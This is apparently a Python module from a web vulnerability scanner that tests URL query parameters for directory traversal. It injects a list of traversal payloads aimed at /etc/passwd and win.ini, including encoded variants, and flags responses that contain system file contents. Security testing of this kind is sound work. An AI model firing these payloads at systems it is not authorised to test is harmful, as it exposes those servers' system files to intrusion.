import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

TRAVERSAL_PAYLOADS = [
    "../../etc/passwd",
    "..\\..\\windows\\win.ini",
    "../../../../../../etc/passwd",
    "../../../../../../windows/win.ini",
    "../" * 10 + "etc/passwd",
    "..%2f..%2f..%2fetc%2fpasswd",
    "..%252f..%252fetc%252fpasswd",
]

def check_traversal(url):
    """Main Directory Traversal Checking Function."""
    result = {
        "vulnerable": False,
        "vulnerability": "Directory Traversal",
        "risk": "High",
        "details": []
    }

    headers = {"User-Agent": "Mozilla/5.0"}

    try:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)

        if not query:
            result["details"].append({"note": "No parameters found to test for Directory Traversal."})
            return result

        for param in query.keys():
            for payload in TRAVERSAL_PAYLOADS:
                modified_query = query.copy()
                modified_query[param] = payload
                test_url = urlunparse(parsed._replace(query=urlencode(modified_query, doseq=True)))

                response = requests.get(test_url, headers=headers, timeout=7)

                # Suspicious evidence
                if "root:x" in response.text or "[extensions]" in response.text or "boot loader" in response.text:
                    result["vulnerable"] = True
                    result["details"].append({
                        "tested_parameter": param,
                        "payload_used": payload,
                        "tested_url": test_url,
                        "reason": "Sensitive file contents detected!"
                    })
                    break  # Stop testing after first detection

        if not result["vulnerable"]:
            result["details"].append({"note": "No directory traversal vulnerabilities detected with basic payloads."})

    except Exception as e:
        result["details"].append({"error": str(e)})

    return result


